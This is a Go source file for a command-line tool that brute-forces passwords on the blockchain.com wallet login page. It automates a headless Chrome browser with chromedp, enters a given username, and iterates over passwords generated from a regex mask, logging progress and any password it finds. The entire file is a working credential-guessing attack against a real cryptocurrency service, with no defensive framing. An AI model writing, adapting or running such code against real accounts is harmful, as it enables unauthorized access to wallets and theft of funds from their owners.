package main

import (
	"context"
	"flag"
	"log"
	"os"
	"regexp/syntax"
	"time"

	"github.com/alixaxel/genex"
	"github.com/chromedp/chromedp"

	"github.com/242617/blockchain.com-bruteforce/bruteforce"
)

var (
	list     bool
	username string
	password string
)

var current string

func main() {

	flag.BoolVar(&list, "list", false, "List mode")
	flag.StringVar(&username, "username", "", "Username")
	flag.StringVar(&password, "password", "", "Password mask")
	flag.Parse()

	file, err := os.OpenFile("bruteforce.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	log.SetFlags(log.Ltime)
	log.SetOutput(file)
	log.Println("start")

	charset, err := syntax.Parse(`[0-9a-zA-Z]`, syntax.Perl)
	die(err)

	input, err := syntax.Parse(password, syntax.Perl)
	die(err)

	start := time.Now()
	attempts, total := 0, genex.Count(input, charset, 3)

	if list {
		log.Println("list combinations")
		for word := range bruteforce.Words(input, charset) {
			log.Println(word)
		}
		log.Printf("total: %d\n", int(total))
		return
	}

	go func() {
		for {
			time.Sleep(10 * time.Second)
			log.Printf("time: %s, %d/%d, current: %s\n", time.Since(start).Round(time.Second).String(), attempts, int(total), current)
		}
	}()

	var cancel func()
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	client, err := chromedp.New(ctx) // , chromedp.WithLog(log.Printf)
	die(err)

	err = client.Run(ctx, chromedp.Tasks{
		chromedp.Navigate("https://login.blockchain.com/#/login"),
		chromedp.SendKeys(bruteforce.LoginSelector, username, chromedp.ByQuery),
	})
	die(err)

	resCh, nothingCh := make(chan string), make(chan struct{})
	go func() {
		for current = range bruteforce.Words(input, charset) {
			tasks := bruteforce.Try(current, resCh)
			err = client.Run(ctx, tasks)
			if err != nil {
				log.Println(err)
				return
			}
			attempts++
		}
		nothingCh <- struct{}{}
	}()

	select {
	case result := <-resCh:
		log.Printf("password: `%s`", result)
	case <-nothingCh:
		log.Println("no password found")
	}

	err = client.Shutdown(ctx)
	die(err)

	err = client.Wait()
	die(err)

	log.Printf("done in %s", time.Since(start).String())
}

func die(err error) {
	if err != nil {
		panic(err)
	}
}
